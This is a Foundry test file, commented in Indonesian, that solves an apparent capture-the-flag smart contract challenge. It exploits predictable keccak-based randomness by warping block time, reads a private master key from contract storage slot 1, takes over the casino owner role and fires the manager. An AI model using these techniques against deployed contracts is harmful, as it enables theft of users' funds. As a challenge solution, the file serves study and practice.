// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/ChallengeManager.sol";
import "../src/Privileged.sol";

contract LocalSolve is Test {
    Setup setup;
    ChallengeManager manager;
    Privileged privileged;
    
    address attacker = makeAddr("hengker_inju");

    function setUp() public {
        // Kita simulasikan deploy dengan key rahasia
        bytes32 secretKey = keccak256("RAHASIA_DAPUR_INJU");
        
        // Setup butuh 110 ETH (100 buat Privileged, 10 buat 2 Challenger awal)
        setup = new Setup{value: 110 ether}(secretKey);
        
        manager = setup.challengeManager();
        privileged = setup.privileged();
        
        vm.deal(attacker, 10 ether);
    }

    function test_Exploit() public {
        vm.startPrank(attacker);

        console.log("=== START EXPLOIT ===");
        
        // 1. Daftar (Bayar 5 ETH) -> Kita dapat ID 3
        manager.approach{value: 5 ether}();
        uint256 myId = 3;
        uint256 strangerId = 1; // Tumbal ID 1

        // 2. Grinding Attribute (Predictable RNG)
        // Kita butuh hasVIPCard = true
        console.log("Grinding Gacha...");
        
        while(true) {
            // Cek apakah sudah VIP
            Privileged.casinoOwnerChallenger memory status = privileged.getRequirmenets(myId);
            if (status.hasVIPCard) {
                console.log("[SUCCESS] VIP Card Acquired!");
                break;
            }

            // Prediksi RNG: keccak256(msg.sender, timestamp) % 4
            // Target: 1 (Upgrade Self)
            uint256 rng = uint256(keccak256(abi.encodePacked(attacker, block.timestamp))) % 4;

            if (rng == 1) {
                // Hajar kalau RNG pas
                manager.upgradeChallengerAttribute(myId, strangerId);
            } else {
                // Skip waktu kalau RNG jelek (Reroll)
                vm.warp(block.timestamp + 13); 
            }
        }

        // 3. Baca Private Variable (masterKey) di Slot 1
        console.log("Stealing Master Key...");
        // Slot 0 = privileged address, Slot 1 = masterKey
        bytes32 leakedKey = vm.load(address(manager), bytes32(uint256(1)));
        console.log("Leaked Key:");
        console.logBytes32(leakedKey);

        // 4. Takeover Casino Owner
        console.log("Taking Over Casino...");
        manager.challengeCurrentOwner(leakedKey);

        // 5. Fire Manager (Objective)
        console.log("Firing Manager...");
        privileged.fireManager();

        vm.stopPrank();

        // 6. Verifikasi
        bool solved = setup.isSolved();
        console.log("Is Solved?", solved);
        assertTrue(solved, "GAGAL: Manager belum dipecat!");
    }
}
